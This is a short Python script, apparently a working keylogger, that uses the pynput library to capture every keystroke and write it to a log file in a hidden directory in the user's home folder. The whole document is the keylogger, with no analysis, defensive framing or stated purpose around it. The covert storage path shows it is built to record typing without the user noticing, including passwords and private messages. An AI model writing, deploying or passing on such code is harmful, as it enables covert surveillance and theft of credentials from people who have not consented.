from pynput.keyboard import Listener, Key
import os

# Path to save the log file, hidden in the user's home directory

logDirectory = os.path.expanduser('~') + '/.hidden_logs'
if not os.path.exists(logDirectory):
    os.makedirs(logDirectory)
logFilePath = os.path.join(logDirectory, 'keystroke.log')

def onPress(key):
    with open(logFilePath, 'a') as logFile:
        try:
            logFile.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                logFile.write(" ")
            else:
                # This will write the name of special keys like 'Key.enter'
                logFile.write(f" {key} ")

def main():
    with Listener(on_press=onPress) as listener:
        listener.join()

if __name__ == '__main__':
    main()
